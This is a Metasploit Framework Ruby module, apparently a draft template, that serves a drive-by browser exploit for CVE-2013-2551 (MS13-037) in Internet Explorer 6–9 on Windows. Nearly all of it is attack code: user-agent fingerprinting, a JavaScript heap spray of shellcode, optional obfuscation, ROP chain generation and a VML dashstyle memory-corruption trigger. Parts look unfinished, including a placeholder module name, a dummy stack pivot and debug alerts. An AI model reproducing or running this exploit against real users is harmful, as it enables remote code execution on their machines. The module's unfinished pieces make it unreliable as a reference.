##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::HttpServer::HTML
	include Msf::Exploit::RopDb
	include Msf::Exploit::Remote::BrowserAutopwn

	autopwn_info({
		:ua_name    => HttpClients::IE,
		:ua_minver  => "6.0",
		:ua_maxver  => "9.0",
		:javascript => true,
		:os_name    => OperatingSystems::WINDOWS,
		:rank       => Rank
	})


	def initialize(info={})
		super(update_info(info,
			'Name'           => "Module Name",
			'Description'    => %q{
				This browser exploit template covers IE6 - IE9, and uses the user-agent HTTP
				header to fingerprint the browser version.  Please note IE8 and newer may
				emulate an older IE version in compatibility modes, in that case the module
				won't be able to detect the browser correctly.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'Nicolas Joly', # Vulnerability discovery and analysis
					'juan vazquez'  # Metasploit module
				],
			'References'     =>
				[
					[ 'CVE', '2013-2551' ],
					[ 'MSB', 'MS13-037' ],
					[ 'URL', 'http://www.vupen.com/blog/20130522.Advanced_Exploitation_of_IE10_Windows8_Pwn2Own_2013.php' ]
				],
			'Payload'        =>
				{
					#'BadChars'        => "\x00",
					'Space'          => 920,
					'DisableNops'    => true,
					'PrependEncoder' => "\x81\xc4\x54\xf2\xff\xff" # Stack adjustment # add esp, -3500
				},
			'DefaultOptions'  =>
				{
					'InitialAutoRunScript' => 'migrate -f'
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Automatic', {} ],
					[ 'IE 6 on Windows XP SP3', { 'Rop' => nil,     'Offset' => '0x5F4' } ],
					[ 'IE 7 on Windows XP SP3', { 'Rop' => nil,     'Offset' => '0x5F4' } ],
					[ 'IE 8 on Windows XP SP3', { 'Rop' => :msvcrt, 'Offset' => '0x5f4' } ],
					[ 'IE 7 on Windows Vista',  { 'Rop' => nil,     'Offset' => '0x5f4' } ],
					[ 'IE 8 on Windows Vista',  { 'Rop' => :jre,    'Offset' => '0x5f4' } ],
					[ 'IE 8 on Windows 7',      { 'Rop' => :jre,    'Offset' => '0x5f4' } ],
					[ 'IE 9 on Windows 7',      { 'Rop' => :jre,    'Offset' => '0x5fe' } ]
				],
			'Privileged'     => false,
			'DisclosureDate' => "Apr 1 2012",
			'DefaultTarget'  => 0))

		register_options(
			[
				OptBool.new('OBFUSCATE', [false, 'Enable JavaScript obfuscation', false])
			], self.class)

	end

	def get_target(agent)
		#If the user is already specified by the user, we'll just use that
		return target if target.name != 'Automatic'

		nt = agent.scan(/Windows NT (\d\.\d)/).flatten[0] || ''
		ie = agent.scan(/MSIE (\d)/).flatten[0] || ''

		ie_name = "IE #{ie}"

		case nt
		when '5.1'
			os_name = 'Windows XP SP3'
		when '6.0'
			os_name = 'Windows Vista'
		when '6.1'
			os_name = 'Windows 7'
		end

		targets.each do |t|
			if (!ie.empty? and t.name.include?(ie_name)) and (!nt.empty? and t.name.include?(os_name))
				print_status("Target selected as: #{t.name}")
				return t
			end
		end

		return nil
	end

	def ie_heap_spray(my_target, p)
		js_code = Rex::Text.to_unescape(p, Rex::Arch.endian(target.arch))
		js_nops = Rex::Text.to_unescape("\x0c"*4, Rex::Arch.endian(target.arch))
		js_random_nops = Rex::Text.to_unescape(make_nops(4), Rex::Arch.endian(my_target.arch))

		# Land the payload at 0x0c0c0c0c
		case my_target
		when targets[7]
			# IE 9 on Windows 7
			js = %Q|
			function randomblock(blocksize)
			{
				var theblock = "";
				for (var i = 0; i < blocksize; i++)
				{
					theblock += Math.floor(Math.random()*90)+10;
				}
				return theblock;
			}

			function tounescape(block)
			{
				var blocklen = block.length;
				var unescapestr = "";
				for (var i = 0; i < blocklen-1; i=i+4)
				{
					unescapestr += "%u" + block.substring(i,i+4);
				}
				return unescapestr;
			}

			var heap_obj = new heapLib.ie(0x10000);
			var code = unescape("#{js_code}");
			var nops = unescape("#{js_random_nops}");
			while (nops.length < 0x80000) nops += nops;
			var offset_length = #{my_target['Offset']};
			for (var i=0; i < 0x1000; i++) {
				var padding = unescape(tounescape(randomblock(0x1000)));
				while (padding.length < 0x1000) padding+= padding;
				var junk_offset = padding.substring(0, offset_length);
				var single_sprayblock = junk_offset + code + nops.substring(0, 0x800 - code.length - junk_offset.length);
				while (single_sprayblock.length < 0x20000) single_sprayblock += single_sprayblock;
				sprayblock = single_sprayblock.substring(0, (0x40000-6)/2);
				heap_obj.alloc(sprayblock);
			}
			|

		else
			# For IE 6, 7, 8
			js = %Q|
			var heap_obj = new heapLib.ie(0x20000);
			var code = unescape("#{js_code}");
			var nops = unescape("#{js_nops}");
			while (nops.length < 0x80000) nops += nops;
			var offset = nops.substring(0, #{my_target['Offset']});
			var shellcode = offset + code + nops.substring(0, 0x800-code.length-offset.length);
			while (shellcode.length < 0x40000) shellcode += shellcode;
			var block = shellcode.substring(0, (0x80000-6)/2);
			heap_obj.gc();
			for (var i=1; i < 0x300; i++) {
				heap_obj.alloc(block);
			}
			var overflow = nops.substring(0, 10);
			|

		end

		js = heaplib(js, {:noobfu => true})

		if datastore['OBFUSCATE']
			js = ::Rex::Exploitation::JSObfu.new(js)
			js.obfuscate
		end

		return js
	end

	def get_payload(t, cli)
		code = payload.encoded

		# No rop. Just return the payload.
		return code if t['Rop'].nil?
		stack_pivot = [0x42424242].pack("V")

		# Both ROP chains generated by mona.py - See corelan.be
		case t['Rop']
		when :msvcrt
			print_status("Using msvcrt ROP")
			rop_payload = generate_rop_payload('msvcrt', code, {'pivot'=>stack_pivot, 'target'=>'xp'})
		else
			print_status("Using JRE ROP")
			rop_payload = generate_rop_payload('java', code, {'pivot'=>stack_pivot})
		end

		return rop_payload
	end

	def load_exploit_html(my_target, cli)
		p  = get_payload(my_target, cli)
		js = ie_heap_spray(my_target, p)
		#{js}
		html = %Q|
		<html>
		<head>
		<script>
		</script>
		<meta http-equiv="x-ua-compatible" content="IE=EmulateIE9">
		<script>
		var a = new Array();
		var my_rect;
		var stroke_array = new Array();
		var oval_array = new Array();

		function funny(){

			Math.atan2(0xbabe, "[*] Creating the rects shapes");

			my_rect    = document.createElement("v:shape")
			my_rect.id = "rect"
			document.body.appendChild(my_rect)

			Math.atan2(0xbabe, "[*] Set up the heap via _anchorRects properties");

			for (var i=0; i<0x1000; i++){ //set up the heap
				a[i] = document.getElementById("rect")._anchorRect;
			}

			Math.atan2(0xbabe, "[*] Make holes");

			for (var j=0x800; j<0x1000; j = j + 2) {
				delete a[j];
				CollectGarbage();
				j = j + 2;
			}

			Math.atan2(0xbabe, "[*] Create some dashstyle of 0x10");

			i = 0;
			oval_array[i] = document.createElement("v:oval");
			stroke_array[i] = document.createElement("v:stroke");
			stroke_array[i].id = "stroke" + i.toString();
			stroke_array[i].dashstyle = "2 2 2 " + i.toString();
			oval_array[i].appendChild(stroke_array[i]);
			document.body.appendChild(oval_array[i]);
			stroke_array[i].dashstyle.array.length = 0 -1;
			alert("0x" + stroke_array[i].dashstyle.array.item(6).toString(16));
			stroke_array[i].dashstyle.array.item(6) = 0x0c0c0c0c - 0x10;
			alert("0x" + stroke_array[i].dashstyle.array.item(6).toString(16));
			for (var j=0x801; j<0x1000; j = j + 2) {
				delete a[j];
				CollectGarbage();
			}
		}
		</script>
		</head>
		<title>
		POC by VUPEN
		</title>
		<!-- Include the VML behavior -->
		<style>v\\: * { behavior:url(#default#VML); display:inline-block }</style>
		<!-- Declare the VML namespace -->
		<xml:namespace ns="urn:schemas-microsoft-com:vml" prefix="v" />
		<body onLoad="funny();">
		</body>
		</html>
		|

		return html
	end

	def on_request_uri(cli, request)
		agent = request.headers['User-Agent']
		uri   = request.uri
		print_status("Requesting: #{uri}")

		my_target = get_target(agent)
		# Avoid the attack if no suitable target found
		if my_target.nil?
			print_error("Browser not supported, sending 404: #{agent}")
			send_not_found(cli)
			return
		end

		html = load_exploit_html(my_target, cli)
		html = html.gsub(/^\t\t/, '')
		print_status("Sending HTML...")
		send_response(cli, html, {'Content-Type'=>'text/html'})
	end

end